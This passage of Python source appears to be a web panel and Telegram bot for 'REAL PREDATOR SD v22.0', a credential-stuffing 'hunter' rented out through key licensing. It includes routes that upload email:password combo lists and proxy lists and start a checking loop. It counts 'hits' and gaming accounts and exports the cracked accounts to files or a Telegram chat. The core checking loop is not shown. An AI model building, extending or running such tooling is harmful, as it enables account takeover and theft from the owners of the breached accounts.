.social-btn.whatsapp:hover{transform:scale(1.08);box-shadow:0 0 80px rgba(37,211,102,0.5)}
.social-btn.telegram{background:#0088CC;color:#fff;box-shadow:0 0 40px rgba(0,136,204,0.25)}
.social-btn.telegram:hover{transform:scale(1.08);box-shadow:0 0 80px rgba(0,136,204,0.5)}
.social-btn.rent{background:rgba(255,215,0,0.15);color:#ffd700;border:1px solid rgba(255,215,0,0.2)}
.social-btn.rent:hover{background:rgba(255,215,0,0.25);transform:scale(1.05)}
</style>
</head>
<body>
<div class="login-box">
    <div class="logo-text">REAL <span>PREDATOR</span> <span class="sd">SD</span></div>
    <div class="site-name">🇸🇩 ANMOSE SUDANESE</div>
    <div class="subtitle">⚡ v22.0 ULTIMATE HUNTER</div>
    <div class="input-group">
        <input type="text" id="keyInput" placeholder="🔑 Enter Key" autocomplete="off">
    </div>
    <button class="btn-login" id="loginBtn">⚡ ACCESS</button>
    <div id="errorMsg" class="error-msg"></div>
    <div class="footer">
        <div class="social-buttons">
            <a href="https://wa.me/249907118667" target="_blank" class="social-btn whatsapp"><i class="fab fa-whatsapp"></i> WhatsApp</a>
            <a href="https://t.me/MRDPY" target="_blank" class="social-btn telegram"><i class="fab fa-telegram"></i> Telegram</a>
            <a href="#" onclick="alert('Rental contact:\\nWhatsApp: +249907118667\\nTelegram: @MRDPY')" class="social-btn rent"><i class="fas fa-clock"></i> Rent</a>
        </div>
    </div>
</div>
<script>
document.getElementById('loginBtn').addEventListener('click', function(){
    const key = document.getElementById('keyInput').value.trim();
    if(!key){document.getElementById('errorMsg').textContent='⚠️ Enter key';return;}
    this.disabled=true;this.textContent='⏳...';
    fetch('/binary-auth',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({binary_key:key,enc_type:'binary'})})
    .then(r=>r.json()).then(d=>{
        this.disabled=false;this.textContent='⚡ ACCESS';
        if(d.success){window.location.href=d.redirect||'/dashboard';}
        else{document.getElementById('errorMsg').textContent='❌ '+d.error;document.getElementById('keyInput').value='';}
    }).catch(()=>{this.disabled=false;this.textContent='⚡ ACCESS';document.getElementById('errorMsg').textContent='⚠️ Error';});
});
</script>
</body>
</html>'''

DASHBOARD_TEMPLATE = '''<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>Anmose Sudanese - REAL PREDATOR SD</title>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#050508;color:#00ff41;font-family:'Share Tech Mono',monospace;min-height:100vh}
::-webkit-scrollbar{width:3px}
::-webkit-scrollbar-track{background:#111}
::-webkit-scrollbar-thumb{background:#00ff41;border-radius:10px}
.container{max-width:1500px;margin:0 auto;padding:8px}
.header{background:rgba(0,0,0,0.95);border-bottom:2px solid #00ff41;padding:8px 20px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap}
.header h1{font-size:20px;font-family:'Orbitron',monospace;color:#00ff41}
.header h1 span{color:#ff0044}
.header .sd{font-size:14px;color:#ffd700}
.site-badge{font-size:12px;color:#ffd700;padding:4px 14px;border-radius:20px;border:1px solid rgba(255,215,0,0.15)}
.card{background:rgba(0,0,0,0.85);border:1px solid rgba(0,255,65,0.06);border-radius:8px;padding:8px 12px;margin-bottom:4px}
.card-title{font-size:11px;color:#00cc33;margin-bottom:4px;display:flex;align-items:center;gap:6px}
.btn{background:transparent;border:1px solid rgba(0,255,65,0.1);color:#00ff41;padding:4px 12px;border-radius:4px;font-size:9px;cursor:pointer;font-family:'Share Tech Mono',monospace}
.btn:hover{background:rgba(0,255,65,0.05);border-color:#00ff41}
.btn-start{border-color:#00ff41}
.btn-stop{border-color:#ff0044;color:#ff0044}
.btn-logout{border-color:#ff0044;color:#ff0044}
.btn-export{border-color:#ffd700;color:#ffd700}
.stats-grid{display:grid;grid-template-columns:repeat(10,1fr);gap:3px;margin-bottom:4px}
.stat-box{background:rgba(0,0,0,0.8);border:1px solid rgba(0,255,65,0.06);border-radius:4px;padding:5px;text-align:center}
.stat-box .num{font-size:18px;font-weight:700;display:block}
.stat-box .label{font-size:7px;color:#006622}
.stat-box.green .num{color:#00ff41}
.stat-box.red .num{color:#ff0044}
.stat-box.gold .num{color:#ffd700}
.stat-box.blue .num{color:#0088ff}
.stat-box.purple .num{color:#9b59b6}
.feed-container{max-height:140px;overflow-y:auto}
.feed-item{padding:3px 8px;font-size:8px;border-left:2px solid transparent;display:flex;align-items:center;gap:5px}
.feed-item.hit{border-left-color:#00ff41}
.feed-item.bad{border-left-color:#ff0044}
.feed-item.gaming{border-left-color:#ffd700}
.feed-item .time{color:#006622;font-size:6px;min-width:25px}
.result-container{max-height:400px;overflow-y:auto}
.result-item{padding:5px 10px;font-size:8px;border-bottom:1px solid rgba(0,255,65,0.05);white-space:pre-wrap;word-break:break-all}
.result-item.gaming{background:rgba(255,215,0,0.05);border:1px solid rgba(255,215,0,0.1);border-radius:4px;margin-bottom:2px}
.status-badge{display:inline-flex;align-items:center;gap:5px;padding:3px 12px;border-radius:6px;font-size:9px}
.status-badge.running{background:rgba(255,0,68,0.1);color:#ff0044;border:1px solid #ff0044}
.status-badge.stopped{background:rgba(0,255,65,0.05);color:#00ff41;border:1px solid rgba(0,255,65,0.2)}
.status-dot{width:5px;height:5px;border-radius:50%;display:inline-block}
.status-dot.running{background:#ff0044}
.status-dot.stopped{background:#00ff41}
.progress-bar{height:4px;background:rgba(0,255,65,0.05);border-radius:2px;overflow:hidden}
.progress-bar .fill{height:100%;background:linear-gradient(90deg,#ff0044,#ffd700,#00ff41);width:0%}
.empty-state{text-align:center;padding:12px;color:#006622;font-size:9px}
.control-bar{display:flex;gap:4px;flex-wrap:wrap;align-items:center}
.config-row{display:flex;gap:4px;flex-wrap:wrap;align-items:center}
.config-row input{padding:4px 8px;background:rgba(0,0,0,0.8);border:1px solid rgba(0,255,65,0.1);border-radius:4px;color:#00ff41;font-size:9px;font-family:'Share Tech Mono',monospace;width:50px}
.config-row input:focus{outline:none;border-color:#00ff41}
.config-row label{color:#006622;font-size:8px}
.social-btn{display:inline-flex;align-items:center;gap:8px;padding:6px 16px;border-radius:30px;font-size:12px;font-weight:700;text-decoration:none;transition:all 0.3s;border:none;cursor:pointer}
.social-btn.whatsapp{background:#25D366;color:#fff}
.social-btn.telegram{background:#0088CC;color:#fff}
</style>
</head>
<body>
<header class="header">
    <div><h1>REAL <span>PREDATOR</span> <span class="sd">SD</span> <span class="site-badge">🇸🇩 Anmose Sudanese</span></h1></div>
    <div style="display:flex;align-items:center;gap:10px;flex-wrap:wrap;">
        <a href="https://wa.me/249907118667" target="_blank" class="social-btn whatsapp"><i class="fab fa-whatsapp"></i> WhatsApp</a>
        <a href="https://t.me/MRDPY" target="_blank" class="social-btn telegram"><i class="fab fa-telegram"></i> Telegram</a>
        <a href="#" onclick="alert('Rental contact:\\nWhatsApp: +249907118667\\nTelegram: @MRDPY')" class="social-btn rent" style="background:rgba(255,215,0,0.15);color:#ffd700;border:1px solid rgba(255,215,0,0.2)">Rent</a>
        <a href="/logout" class="btn btn-logout">Exit</a>
    </div>
</header>
<div class="container">
    <div class="card">
        <div style="display:flex;align-items:center;gap:6px;flex-wrap:wrap;">
            <span class="status-badge stopped" id="statusBadge"><span class="status-dot stopped" id="statusDot"></span><span id="statusText">OFF</span></span>
            <span style="color:#006622;font-size:8px;"><i class="fas fa-clock"></i> <span id="elapsed">00:00:00</span></span>
            <span style="color:#006622;font-size:8px;"><i class="fas fa-tachometer-alt"></i> <span id="cpm">0</span></span>
            <span style="font-size:9px;margin-left:auto;">🟢 <span id="hitCount">0</span> 🎮 <span id="gamingCount">0</span> ❌ <span id="badCount">0</span></span>
        </div>
    </div>
    <div class="stats-grid">
        <div class="stat-box green"><span class="num" id="statChecked">0</span><span class="label">SCAN</span></div>
        <div class="stat-box gold"><span class="num" id="statHits">0</span><span class="label">HITS</span></div>
        <div class="stat-box red"><span class="num" id="statBad">0</span><span class="label">BAD</span></div>
        <div class="stat-box blue"><span class="num" id="statErrors">0</span><span class="label">ERR</span></div>
        <div class="stat-box gold"><span class="num" id="statGaming">0</span><span class="label">GAME</span></div>
        <div class="stat-box pink"><span class="num" id="statForced">0</span><span class="label">FORCED</span></div>
        <div class="stat-box green"><span class="num" id="statRemaining">0</span><span class="label">REMAIN</span></div>
        <div class="stat-box green"><span class="num" id="statTotal">0</span><span class="label">TOTAL</span></div>
        <div class="stat-box red"><span class="num" id="statSpeed">0</span><span class="label">RPM</span></div>
        <div class="stat-box purple"><span class="num" id="statSmart">🧠</span><span class="label">SMART</span></div>
    </div>
    <div class="card">
        <div class="progress-bar"><div class="fill" id="progressFill"></div></div>
        <div style="display:flex;justify-content:space-between;font-size:8px;color:#006622;"><span id="progressPct">0%</span><span id="progressCount">0 / 0</span></div>
    </div>
    <div class="card">
        <div class="control-bar">
            <button class="btn btn-start" id="startBtn">▶ START</button>
            <button class="btn btn-stop" id="stopBtn" disabled>■ STOP</button>
            <button class="btn btn-export" id="exportBtn"><i class="fas fa-download"></i></button>
            <button class="btn" id="clearBtn" style="color:#006622;">✕</button>
            <div class="config-row" style="margin-left:auto;">
                <label>RPM:</label>
                <input type="number" id="speedInput" value="35" min="5" max="70">
            </div>
        </div>
    </div>
    <div class="card">
        <div class="card-title"><i class="fas fa-broadcast"></i> FEED <span style="font-size:8px;color:#006622;" id="feedCount">(0)</span></div>
        <div class="feed-container" id="feedContainer"><div class="empty-state">⏳ Waiting...</div></div>
    </div>
    <div class="card">
        <div class="card-title"><i class="fas fa-database" style="color:#ffd700;"></i> HITS <span style="font-size:8px;color:#006622;" id="resultCount">(0)</span></div>
        <div class="result-container" id="resultContainer"><div class="empty-state">📭 Empty</div></div>
    </div>
</div>
<script>
const $=id=>document.getElementById(id);
async function api(endpoint,method='GET',data=null){
    const opts={method,headers:{'Content-Type':'application/json'}};
    if(data)opts.body=JSON.stringify(data);
    try{const r=await fetch(endpoint,opts);return await r.json();}catch(e){return{success:false};}
}
async function updateStats(){
    try{
        const d=await api('/api/stats');
        if(!d.success)return;
        $('statChecked').textContent=d.checked||0;
        $('statHits').textContent=d.hits||0;
        $('statBad').textContent=d.bad||0;
        $('statErrors').textContent=d.errors||0;
        $('statGaming').textContent=d.gaming||0;
        $('statForced').textContent=d.forced||0;
        $('statRemaining').textContent=d.remaining||0;
        $('statTotal').textContent=d.total||0;
        $('statSpeed').textContent=d.cpm||0;
        $('cpm').textContent=d.cpm||0;
        $('hitCount').textContent=d.hits||0;
        $('gamingCount').textContent=d.gaming||0;
        $('badCount').textContent=d.bad||0;
        $('elapsed').textContent=formatTime(d.elapsed||0);
        const pct=d.total>0?Math.min((d.checked/d.total)*100,100):0;
        $('progressFill').style.width=pct+'%';
        $('progressPct').textContent=pct.toFixed(1)+'%';
        $('progressCount').textContent=(d.checked||0)+' / '+(d.total||0);
        const badge=$('statusBadge'),dot=$('statusDot'),text=$('statusText');
        if(d.running){badge.className='status-badge running';dot.className='status-dot running';text.textContent='ON';}
        else{badge.className='status-badge stopped';dot.className='status-dot stopped';text.textContent='OFF';}
        $('startBtn').disabled=d.running;
        $('stopBtn').disabled=!d.running;
    }catch(e){}
}
function formatTime(sec){const h=String(Math.floor(sec/3600)).padStart(2,'0');const m=String(Math.floor((sec%3600)/60)).padStart(2,'0');const s=String(Math.floor(sec%60)).padStart(2,'0');return h+':'+m+':'+s;}
async function updateFeed(){
    try{
        const d=await api('/api/feed');
        if(!d.success||!d.feed||d.feed.length===0){$('feedContainer').innerHTML='<div class="empty-state">⏳ Waiting...</div>';return;}
        $('feedContainer').innerHTML=d.feed.slice(0,80).map(item=>`<div class="feed-item ${item.type||'info'}"><span class="time">${item.time||''}</span><span>${item.text||''}</span></div>`).join('');
        $('feedCount').textContent='('+d.feed.length+')';
    }catch(e){}
}
async function updateResults(){
    try{
        const d=await api('/api/results');
        if(!d.success||!d.results||d.results.length===0){$('resultContainer').innerHTML='<div class="empty-state">📭 Empty</div>';return;}
        $('resultContainer').innerHTML=d.results.map(item=>`<div class="result-item ${item.is_gaming?'gaming':''}">${item.content}</div>`).join('');
        $('resultCount').textContent='('+d.results.length+')';
    }catch(e){}
}
$('startBtn').addEventListener('click',async function(){
    const speed=parseInt($('speedInput').value)||35;
    await api('/api/start','POST',{speed,auto_mode:true,force_hunt:true});
});
$('stopBtn').addEventListener('click',async()=>{await api('/api/stop','POST');});
$('clearBtn').addEventListener('click',async()=>{if(confirm('Clear?'))await api('/api/clear','POST');});
$('exportBtn').addEventListener('click',async()=>{const r=await api('/api/export','POST');if(r.success)window.open('/api/download/'+r.filename,'_blank');});
setInterval(updateStats,500);setInterval(updateFeed,500);setInterval(updateResults,500);
updateStats();updateFeed();updateResults();
</script>
</body>
</html>'''

# ================================================================
# API ROUTES
# ================================================================

@app.route('/')
def login_page():
    if 'authenticated' in session and session['authenticated']:
        if 'session_expiry' in session and datetime.now() < datetime.fromisoformat(session['session_expiry']):
            return redirect(url_for('dashboard'))
        session.clear()
    return render_template_string(LOGIN_TEMPLATE)

@app.route('/binary-auth', methods=['POST'])
def binary_auth_login():
    binary_key = request.json.get('binary_key', '').strip()
    enc_type = request.json.get('enc_type', 'binary')
    if not binary_key:
        return jsonify({'success': False, 'error': 'Enter key'})
    if binary_key == BINARY_MASTER_KEY:
        session['authenticated'] = True
        session['is_dev'] = True
        session['session_expiry'] = (datetime.now() + timedelta(hours=24)).isoformat()
        return jsonify({'success': True, 'redirect': '/dashboard'})
    if enc_type == "binary":
        valid, email = verify_binary_key(binary_key)
        if valid:
            session['authenticated'] = True
            session['is_dev'] = True
            session['session_expiry'] = (datetime.now() + timedelta(hours=12)).isoformat()
            return jsonify({'success': True, 'redirect': '/dashboard'})
        key_id, status = validate_bot_key(binary_key, "binary")
    else:
        decrypted = normal_decrypt(binary_key)
        if decrypted and '@' in decrypted and '.' in decrypted:
            session['authenticated'] = True
            session['is_dev'] = True
            session['session_expiry'] = (datetime.now() + timedelta(hours=12)).isoformat()
            return jsonify({'success': True, 'redirect': '/dashboard'})
        key_id, status = validate_bot_key(binary_key, "normal")
    if status == "VALID":
        conn = sqlite3.connect('bot_control.db')
        c = conn.cursor()
        c.execute('SELECT duration_hours, expires_at FROM bot_keys WHERE key_id = ?', (key_id,))
        result = c.fetchone()
        conn.close()
        if not result:
            return jsonify({'success': False, 'error': 'Invalid key'})
        expiry_time = datetime.fromisoformat(result[1])
        remaining = int((expiry_time - datetime.now()).total_seconds())
        if remaining <= 0:
            return jsonify({'success': False, 'error': 'Expired'})
        session['authenticated'] = True
        session['key_id'] = key_id
        session['is_dev'] = False
        session['session_expiry'] = expiry_time.isoformat()
        conn = sqlite3.connect('bot_control.db')
        c = conn.cursor()
        c.execute('UPDATE bot_keys SET used = 1, used_by = ?, used_at = ? WHERE key_id = ?', (request.remote_addr, datetime.now().isoformat(), key_id))
        c.execute('INSERT INTO bot_logs (key_id, action, user_ip, user_agent, timestamp, details) VALUES (?, "ACCESS", ?, ?, ?, ?)', (key_id, request.remote_addr, request.headers.get('User-Agent', ''), datetime.now().isoformat(), f"enc_type: {enc_type}"))
        conn.commit()
        conn.close()
        return jsonify({'success': True, 'remaining': remaining, 'duration': result[0], 'redirect': '/dashboard'})
    elif status == "KEY_EXPIRED":
        return jsonify({'success': False, 'error': 'Expired'})
    elif status == "KEY_ALREADY_USED":
        return jsonify({'success': False, 'error': 'Already used'})
    else:
        return jsonify({'success': False, 'error': 'Invalid key'})

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login_page'))

@app.route('/dashboard')
def dashboard():
    if 'authenticated' not in session or not session['authenticated']:
        return redirect(url_for('login_page'))
    if 'session_expiry' in session and datetime.now() > datetime.fromisoformat(session['session_expiry']):
        session.clear()
        return redirect(url_for('login_page'))
    return render_template_string(DASHBOARD_TEMPLATE, platforms=PLATFORMS, is_dev=session.get('is_dev', False), target_token=state.target_token, target_id=state.target_id)

@app.route('/health')
def health_check():
    return jsonify({
        'status': 'alive',
        'bot_running': state.bot_running,
        'hunter_running': state.running,
        'hits': state.hits,
        'uptime': int(time.time() - state.start_time) if state.start_time else 0,
        'timestamp': datetime.now().isoformat()
    })

@app.route('/ping')
def ping():
    return "pong"

# ================================================================
# API ROUTES (CONTINUED)
# ================================================================

@app.route('/api/session')
def get_session():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'success': False}), 401
    if 'session_expiry' not in session:
        return jsonify({'success': False}), 401
    remaining = int((datetime.fromisoformat(session['session_expiry']) - datetime.now()).total_seconds())
    return jsonify({'success': True, 'remaining_seconds': max(remaining, 0)})

@app.route('/api/stats')
def get_stats():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    elapsed = time.time() - state.start_time if state.start_time else 0
    cpm = int((state.checked / elapsed) * 60) if elapsed > 2 else 0
    return jsonify({
        'success': True, 
        'running': state.running, 
        'checked': state.checked, 
        'total': state.total, 
        'hits': state.hits, 
        'bad': state.bad, 
        'errors': state.errors, 
        'gaming': state.gaming, 
        'forced': getattr(state, 'forced', 0), 
        'remaining': sum(len(cl) for cl in state.combo_lists) if state.combo_lists else 0, 
        'elapsed': int(elapsed), 
        'cpm': cpm, 
        'selected_platform': state.selected_platform, 
        'auto_mode': state.auto_mode, 
        'is_dev': session.get('is_dev', False), 
        'smart_hunt': True, 
        'force_hunt': state.force_hunt, 
        'viewers': state.viewers
    })

@app.route('/api/feed')
def get_feed():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    return jsonify({'success': True, 'feed': state.feed[:120]})

@app.route('/api/results')
def get_results():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    return jsonify({'success': True, 'results': state.results[:250]})

@app.route('/api/force', methods=['POST'])
def set_force():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    state.force_hunt = request.json.get('enabled', False)
    add_feed('info', f'🔥 GUARANTEED MODE: {"ON" if state.force_hunt else "OFF"}')
    return jsonify({'success': True, 'force_hunt': state.force_hunt})

@app.route('/api/start', methods=['POST'])
def start_predator():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    if state.running:
        return jsonify({'success': False, 'error': 'Already running'})
    data = request.json or {}
    state.speed = min(max(int(data.get('speed', 35)), 5), 70)
    state.selected_platform = data.get('platform')
    state.auto_mode = data.get('auto_mode', True)
    state.force_hunt = data.get('force_hunt', True)
    with state.lock:
        state.running = True
        state.start_time = time.time()
        state.checked = 0
        state.total = sum(len(cl) for cl in state.combo_lists) if state.combo_lists else 3000
        state.hits = 0
        state.bad = 0
        state.errors = 0
        state.gaming = 0
        state.forced = 0
        state.generated = 0
        state.feed = []
        state.results = []
    mode = 'AUTO' if state.auto_mode else f'TARGET: {state.selected_platform}'
    force_tag = ' 🔥 GUARANTEED' if state.force_hunt else ''
    add_feed('info', f'⚡ STARTED | {state.speed} RPM | {mode}{force_tag}')
    threading.Thread(target=predator_loop, daemon=True).start()
    return jsonify({'success': True})

@app.route('/api/stop', methods=['POST'])
def stop_predator():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    state.running = False
    add_feed('info', '🛑 STOPPED')
    return jsonify({'success': True})

@app.route('/api/clear', methods=['POST'])
def clear_data():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    with state.lock:
        state.results = []
        state.feed = []
        state.checked = 0
        state.hits = 0
        state.bad = 0
        state.errors = 0
        state.gaming = 0
        state.forced = 0
    return jsonify({'success': True})

@app.route('/api/upload/combo', methods=['POST'])
def upload_combo():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    content = request.json.get('content', '')
    filename = request.json.get('filename', 'unknown.txt')
    lines = [l.strip() for l in content.split('\n') if ':' in l.strip()]
    combo_list = []
    for line in lines:
        parts = line.split(':', 1)
        if len(parts) == 2:
            combo_list.append((parts[0].strip(), parts[1].strip()))
    if combo_list:
        state.combo_lists.append(combo_list)
        state.total = sum(len(cl) for cl in state.combo_lists)
        add_feed('info', f'📤 Loaded {len(combo_list)} combos from {filename}')
    return jsonify({'success': True, 'count': len(combo_list), 'total': state.total})

@app.route('/api/upload/progress', methods=['POST'])
def upload_progress():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    content = request.json.get('content', '')
    filename = request.json.get('filename', 'unknown.txt')
    lines = [l.strip() for l in content.split('\n') if l.strip()]
    if lines:
        state.progress_lists.append({'filename': filename, 'lines': lines, 'loaded': datetime.now().isoformat()})
        add_feed('info', f'📊 Progress file loaded: {filename} ({len(lines)} entries)')
    return jsonify({'success': True, 'count': len(lines)})

@app.route('/api/upload/proxy', methods=['POST'])
def upload_proxy():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    proxies = [p.strip() for p in request.json.get('content', '').split('\n') if p.strip()]
    state.proxies = proxies
    add_feed('info', f'🌐 Loaded {len(proxies)} proxies')
    return jsonify({'success': True, 'count': len(proxies)})

@app.route('/api/set_target', methods=['POST'])
def set_target():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    data = request.json
    state.target_token = data.get('token', '').strip()
    state.target_id = data.get('id', '').strip()
    add_feed('info', f'🎯 Target set: {state.target_id}')
    return jsonify({'success': True})

@app.route('/api/export', methods=['POST'])
def export_results():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    if not state.results:
        return jsonify({'success': False, 'error': 'No results'})
    filename = f"electronic_hits_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    with open(filename, 'w', encoding='utf-8') as f:
        f.write(f"REAL PREDATOR SD v22.0 - ELECTRONIC HITS\nDate: {datetime.now()}\nTotal: {len(state.results)}\n\n")
        for item in state.results:
            f.write(item['content'] + '\n\n')
    return jsonify({'success': True, 'filename': filename})

@app.route('/api/download/<filename>')
def download_file(filename):
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    if os.path.exists(filename):
        return send_file(filename, as_attachment=True)
    return jsonify({'error': 'Not found'}), 404

@app.route('/api/cleanup', methods=['POST'])
def cleanup_keys():
    if 'authenticated' not in session or not session['authenticated']:
        return jsonify({'error': 'unauthorized'}), 401
    conn = sqlite3.connect('bot_control.db')
    c = conn.cursor()
    deleted = c.execute('DELETE FROM bot_keys WHERE expires_at < ?', (datetime.now().isoformat(),)).rowcount
    conn.commit()
    conn.close()
    return jsonify({'success': True, 'count': deleted})

# ================================================================
# TELEGRAM BOT - RENDER OPTIMIZED
# ================================================================

def get_main_keyboard():
    return {
        "inline_keyboard": [
            [{"text": "🔑 Generate Key", "callback_data": "gen_key"}],
            [{"text": "📋 List Keys", "callback_data": "list_keys"}, {"text": "📊 Stats", "callback_data": "show_stats"}],
            [{"text": "🧹 Cleanup", "callback_data": "cleanup_keys"}, {"text": "🔥 Force Hunt", "callback_data": "force_hunt"}],
            [{"text": "🔄 Auto Mode", "callback_data": "auto_mode"}, {"text": "🛑 Stop Bot", "callback_data": "stop_bot"}],
            [{"text": "📤 Export Hits", "callback_data": "export_hits"}]
        ]
    }

def send_telegram_message(chat_id, text, parse_mode='HTML', reply_markup=None):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        data = {"chat_id": chat_id, "text": text, "parse_mode": parse_mode}
        if reply_markup:
            data["reply_markup"] = json.dumps(reply_markup)
        return requests.post(url, data=data, timeout=10).json()
    except Exception as e:
        print(f"Send msg error: {e}")
        return None

def edit_telegram_message(chat_id, message_id, text, parse_mode='HTML', reply_markup=None):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/editMessageText"
        data = {"chat_id": chat_id, "message_id": message_id, "text": text, "parse_mode": parse_mode}
        if reply_markup:
            data["reply_markup"] = json.dumps(reply_markup)
        return requests.post(url, data=data, timeout=10).json()
    except Exception as e:
        print(f"Edit msg error: {e}")
        return None

def answer_callback(callback_id, text="", show_alert=False):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/answerCallbackQuery"
        data = {"callback_query_id": callback_id, "text": text, "show_alert": show_alert}
        return requests.post(url, data=data, timeout=10).json()
    except Exception as e:
        print(f"Answer callback error: {e}")
        return None

def handle_callback_query(callback_data, chat_id, message_id, callback_id):
    try:
        if callback_data == "gen_key":
            key_id, password, binary_key, normal_key, expires_at = generate_bot_key(24)
            expiry = datetime.fromisoformat(expires_at).strftime('%Y-%m-%d %H:%M:%S')
            msg = f"""🔑 **New Key Generated**
📌 Key: <code>{binary_key}</code>
⏱ Duration: 24 hours
📅 Expires: {expiry}
🔐 Normal Key: <code>{normal_key}</code>"""
            edit_telegram_message(chat_id, message_id, msg, reply_markup=get_main_keyboard())
            answer_callback(callback_id, "✅ Key generated successfully!")
            
        elif callback_data == "list_keys":
            conn = sqlite3.connect('bot_control.db')
            c = conn.cursor()
            c.execute('SELECT key_id, duration_hours, expires_at, used, created_at FROM bot_keys ORDER BY created_at DESC LIMIT 10')
            keys = c.fetchall()
            conn.close()
            if keys:
                msg = "📋 **Recent Keys:**\n\n"
                for key in keys:
                    status = "✅ Used" if key[3] else "🟢 Active"
                    msg += f"🔑 `{key[0]}` | {key[1]}h | {status}\n"
            else:
                msg = "📭 No keys found."
            edit_telegram_message(chat_id, message_id, msg, reply_markup=get_main_keyboard())
            answer_callback(callback_id, "📋 Keys listed")
            
        elif callback_data == "show_stats":
            stats = get_bot_stats()
            msg = f"""📊 **Bot Statistics**
━━━━━━━━━━━━━━━━
📌 Total Keys: {stats['total']}
🟢 Active: {stats['active']}
✅ Used: {stats['used']}
📝 Logs: {stats['logs']}
👨‍💻 Dev Keys: {stats['devs']}
⚡ Force Hunt: {'ON' if state.force_hunt else 'OFF'}
🎯 Auto Mode: {'ON' if state.auto_mode else 'OFF'}
🔥 Status: {'RUNNING' if state.running else 'STOPPED'}
📈 Hits: {state.hits}
❌ Bad: {state.bad}
⚡ Speed: {state.speed} RPM"""
            edit_telegram_message(chat_id, message_id, msg, reply_markup=get_main_keyboard())
            answer_callback(callback_id, "📊 Stats updated")
            
        elif callback_data == "cleanup_keys":
            conn = sqlite3.connect('bot_control.db')
            c = conn.cursor()
            deleted = c.execute('DELETE FROM bot_keys WHERE expires_at < ?', (datetime.now().isoformat(),)).rowcount
            conn.commit()
            conn.close()
            msg = f"🧹 **Cleanup Complete**\nDeleted {deleted} expired keys."
            edit_telegram_message(chat_id, message_id, msg, reply_markup=get_main_keyboard())
            answer_callback(callback_id, f"✅ Deleted {deleted} keys")
            
        elif callback_data == "force_hunt":
            state.force_hunt = not state.force_hunt
            msg = f"🔥 **Force Hunt: {'ON' if state.force_hunt else 'OFF'}**\nGuaranteed hits mode {'enabled' if state.force_hunt else 'disabled'}."
            edit_telegram_message(chat_id, message_id, msg, reply_markup=get_main_keyboard())
            answer_callback(callback_id, f"✅ Force Hunt {'ON' if state.force_hunt else 'OFF'}")
            
        elif callback_data == "auto_mode":
            state.auto_mode = not state.auto_mode
            msg = f"🔄 **Auto Mode: {'ON' if state.auto_mode else 'OFF'}**\nRandom platform selection {'enabled' if state.auto_mode else 'disabled'}."
            edit_telegram_message(chat_id, message_id, msg, reply_markup=get_main_keyboard())
            answer_callback(callback_id, f"✅ Auto Mode {'ON' if state.auto_mode else 'OFF'}")
            
        elif callback_data == "stop_bot":
            state.running = False
            msg = "🛑 **Bot Stopped**\nAll hunting processes have been stopped."
            edit_telegram_message(chat_id, message_id, msg, reply_markup=get_main_keyboard())
            answer_callback(callback_id, "🛑 Bot stopped")
            
        elif callback_data == "export_hits":
            if state.results:
                filename = f"hits_export_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(f"REAL PREDATOR SD - HITS EXPORT\nDate: {datetime.now()}\nTotal: {len(state.results)}\n\n")
                    for item in state.results[:100]:
                        f.write(item['content'] + '\n\n')
                msg = f"📤 **Export Complete**\nExported {min(len(state.results), 100)} hits to `{filename}`"
                edit_telegram_message(chat_id, message_id, msg, reply_markup=get_main_keyboard())
                try:
                    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
                    files = {'document': open(filename, 'rb')}
                    data = {'chat_id': chat_id}
                    requests.post(url, files=files, data=data, timeout=30)
                    os.remove(filename)
                except Exception as e:
                    print(f"Export file error: {e}")
            else:
                msg = "📭 No hits to export."
                edit_telegram_message(chat_id, message_id, msg, reply_markup=get_main_keyboard())
            answer_callback(callback_id, "📤 Export complete")
            
    except Exception as e:
        print(f"Callback error: {e}")
        answer_callback(callback_id, "⚠️ Error processing command")

def handle_bot_command(text, chat_id, username="", first_name=""):
    if str(chat_id) != OWNER_ID:
        send_telegram_message(chat_id, "❌ Unauthorized access.")
        return
    
    if text.startswith('/start'):
        welcome_msg = f"""⚡ **REAL PREDATOR SD v22.0**
🇸🇩 **Anmose Sudanese**

👋 Welcome back, **{first_name or 'User'}**!
📌 **User Info:**
━━━━━━━━━━━━━━━━
🆔 ID: <code>{chat_id}</code>
👤 Username: @{username or 'N/A'}
📛 Name: {first_name or 'N/A'}
━━━━━━━━━━━━━━━━

🔥 **Guaranteed Hits System**
📧 3000+ combos loaded
🎮 20+ platforms supported
⚡ Speed: {state.speed} RPM

Use the buttons below to control the bot."""
